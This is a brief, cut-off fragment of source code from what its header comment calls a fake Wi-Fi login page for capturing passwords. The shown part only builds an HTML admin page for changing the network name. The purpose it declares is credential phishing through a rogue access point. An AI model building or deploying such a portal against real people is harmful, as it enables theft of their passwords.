// Fake Wi-Fi login page capturing passwords
...
String ssid() {
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the „Change SSID” button, you will lose the connection, so restart your device from Fake-WiFi-login-page and reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID:</label>" +
